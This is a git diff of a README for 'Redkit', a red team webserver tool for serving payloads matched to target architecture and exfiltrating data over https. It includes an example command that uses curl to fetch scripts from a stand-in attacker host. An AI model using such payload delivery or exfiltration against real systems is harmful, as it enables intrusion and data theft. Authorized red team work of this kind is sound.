@@ -1,5 +1,7 @@
-# redbag
-A red team's toolbag.
+# Redkit
+A red team's toolkit webserver. Quickly spin up a webserver that can deliver your payloads curated to target architecture, and easily exfiltrate data over https.
+
+## Current Features
 
 Creates a webserver in the current directory that serves files out of `bin/`. Simply `curl http://attacker.lan:8080/bin/yourscripts.sh`.
 
